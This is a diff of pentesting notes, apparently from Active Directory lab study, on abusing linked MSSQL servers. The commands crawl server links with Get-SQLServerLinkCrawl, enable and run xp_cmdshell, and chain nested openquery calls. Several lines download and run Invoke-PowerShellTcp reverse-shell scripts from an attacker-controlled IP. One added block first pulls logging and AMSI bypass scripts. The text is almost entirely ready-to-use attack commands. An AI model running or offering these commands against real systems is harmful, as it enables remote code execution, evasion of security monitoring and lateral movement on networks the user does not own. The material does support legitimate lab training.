@@ -66,17 +66,27 @@ select * from openquery(""nextHost",'select * from openquery("nexNextHost","sele
 </strong>Get-SQLServerLinkCrawl -instance mssqlhostname -query "exec master..xp_cmdshell 'powershell download cradle"
 
 ❗Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.x.x/Invoke-PowerShellTcp.ps1'')"'
+
+Get-SQLServerLinkCrawl -Instance usmssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami'''
+
+Get-SQLServerLinkCrawl -Instance usmssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget db-sqlsrv
 <strong>
 </strong>//this runs accross all links
 => only for eu-sql we get an output
 </code></pre>
 
 **Executing Commands**\
-****Target server should have xp\_cmdshell or rpcout (disabled by default)
+Target server should have xp\_cmdshell or rpcout (disabled by default)
 
-* If rpcout is enalbed, you can enable xp\_cmdshell using\
-  EXECUTE('sp\_configure "xp\_cmdshell",1;reconfigure;') AT "link-name"
-* Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp\_cmdshell on every link of the chain)&#x20;
+* If **rpcout is enabled, you can enable xp\_cmdshell using**
+
+```
+EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "link-name"
+```
+
+
+
+* Use the -QuertyTarget parameter to run Query on a specific instance **(without -QueryTarget the command tries to use xp\_cmdshell on every link of the chain!)**&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
@@ -85,6 +95,22 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'w
 From the initial SQL Server, OS commands can be executed using nested link queries:
 select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select
 @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
+
+From the initial SQL server, OS commands can be executed using nested
+link queries:
+select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
+
+
+```
+{% endcode %}
+
+Advanced bypass and reverse shell
+
+{% code overflow="wrap" %}
+```powershell
+Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing
+http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing
+http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''
 ```
 {% endcode %}
 
